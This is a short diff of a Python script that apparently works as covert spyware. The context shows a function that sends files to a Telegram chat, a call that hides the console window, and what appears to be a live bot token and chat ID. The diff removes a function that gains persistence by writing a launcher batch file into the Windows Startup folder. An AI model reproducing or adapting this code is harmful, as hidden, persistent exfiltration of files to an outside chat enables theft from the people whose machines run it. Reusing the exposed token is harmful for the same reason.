@@ -282,26 +282,9 @@ def send_file_to_telegram(bot_token, chat_id, file_path, caption=""):
     except Exception as e:
         print(f"Error sending file to Telegram: {e}")
 
-def add_to_startup(script_path=None):
-    if script_path is None:
-        script_path = os.path.abspath(sys.argv[0])  # Current script
-
-    startup_folder = os.path.join(
-        os.environ["APPDATA"],
-        "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    )
-
-    bat_path = os.path.join(startup_folder, "MyScriptLauncher.bat")
-
-    with open(bat_path, "w") as bat_file:
-        bat_file.write(f'start "" "{sys.executable}" "{script_path}"')
-
-    print(f"Added to startup: {bat_path}")
-
 # ===== MAIN LOGIC =====
 if __name__ == "__main__":
     hide_console()
-    add_to_startup()
 
     bot_token = "7325793441:AAE60APFUK9PXhip0Dnk3xHoyS8th3VSCC0"
     chat_id = "-1002626516608"
